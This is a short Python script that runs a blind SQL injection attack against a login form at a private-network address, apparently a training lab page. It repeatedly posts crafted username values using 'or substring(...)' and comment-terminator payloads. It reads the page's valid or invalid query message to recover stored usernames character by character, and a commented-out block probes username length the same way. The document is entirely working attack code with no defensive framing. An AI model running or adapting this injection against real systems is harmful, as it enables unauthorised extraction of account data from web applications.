#!/usr/bin/python3
import requests
from string import ascii_letters
from string import digits
from bs4 import BeautifulSoup
MAX_FIELD_LENGTH = 24

"""
length = 5
params = {'userName': "' or length(userName)>" + str(length) + " -- '" , 'password': ''}
print(" the answer is:", get_answer(params))
"""

def buildCharacterArray(startingChars):
    valids = []
    for iterChar in ascii_letters+digits:
        print("{}".format(startingChars+iterChar))
        params = {'userName': "' or substring(userName,1,{})=\"{}\" -- '".format(len(startingChars+iterChar),startingChars+iterChar),
                  'password':''}
        r = requests.post('http://192.168.203.205/blind/login-clues.php', data=params)
        if isRequestValid(BeautifulSoup(r.text)):
            valids.append(startingChars+iterChar)
            print("'{}' is valid".format(startingChars+iterChar))
    return valids


def isRequestValid(bsObj):
    if "Valid SELECT" in bsObj.find('div', {'class':'message'}).text:
        return True
    elif "Invalid SELECT" in bsObj.find('div', {'class':'message'}).text:
        return False
    else:
        print("Neither valid nor invalid found, instead found")
        print(bsObj.find('div', {'class':'message'}).text)
        return None

def main():
    MAX_COUNT = 3
    oldValids = buildCharacterArray("")
    counter = 1
    while counter <= MAX_COUNT:
        newValids = []
        for elt in oldValids:
            newValids.extend(buildCharacterArray(elt))
        oldValids = newValids
        counter += 1
main()
